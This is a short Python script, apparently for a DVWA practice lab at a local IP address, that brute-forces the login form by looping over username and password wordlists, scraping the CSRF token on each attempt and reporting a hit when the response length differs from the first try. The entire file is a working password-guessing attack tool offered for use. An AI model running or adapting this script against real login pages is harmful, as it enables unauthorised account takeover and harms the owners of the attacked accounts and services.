import requests
import argparse
from bs4 import BeautifulSoup

import argparse

parser = argparse.ArgumentParser(description="Brute Force Attack for dvwa\nand detect based on response length")
parser.add_argument('username',metavar='u', type=str, nargs='+',
					help="Input username file")
parser.add_argument('password',metavar='p', type=str, nargs='+',
					help="Input password file")
args = parser.parse_args()


def request(url,payload):
	with requests.session() as s:
		req = s.get(url)

		soup = BeautifulSoup(req.text, 'lxml')
		csrf = soup.select('input')[3]['value']
		payload = {**payload, **{'user_token': csrf}}
		login_req = s.post('http://192.168.0.27/dvwa/login.php',data=payload)
		
		return len(login_req.content)

def main():
	url = 'http://192.168.0.27/dvwa/'
	cnt = 0
	users = [w.strip() for w in open(args.username[0], "rb").readlines()]
	for username in users:
		passwd = [p.strip() for p in open(args.password[0], "rb").readlines()]
		for password in passwd:
			payload = {
				'username' : username,
				'password' : password,
				'Login' : 'Login'
			}
			if cnt == 0:
				ioc = request(url,payload)
				cnt = cnt + 1
				print(f"Try {username} {password}...")
			else:
				diff = request(url,payload)
				cnt = cnt + 1
				print(f"Try {username} {password}...")
				if ioc != diff:
					print(f"Result username:{username} password:{password}...")
					exit(1)

if __name__ == '__main__':
	main()